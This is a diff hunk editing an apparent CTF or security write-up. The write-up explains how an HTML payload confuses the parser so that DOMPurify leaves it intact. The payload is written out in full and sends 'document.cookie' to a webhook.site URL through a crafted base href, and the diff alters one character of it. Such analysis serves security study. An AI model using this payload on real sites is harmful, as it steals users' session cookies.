@@ -790,7 +790,7 @@ First and foremost, the important point of this question is that the webpage is 
 For example, the payload provided by the author:
 
 ``` html
-<div><div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div><style><![CDATA[</style><div data-x="]]></style><iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>
+<div><div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div><style><![CDATA[</style><div data-x="]]＞</style><iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>
 ```
 
 will be parsed by the HTML parser as a style tag + a div with the `data-x` attribute, so DOMPurify won't do anything, and this is valid HTML.
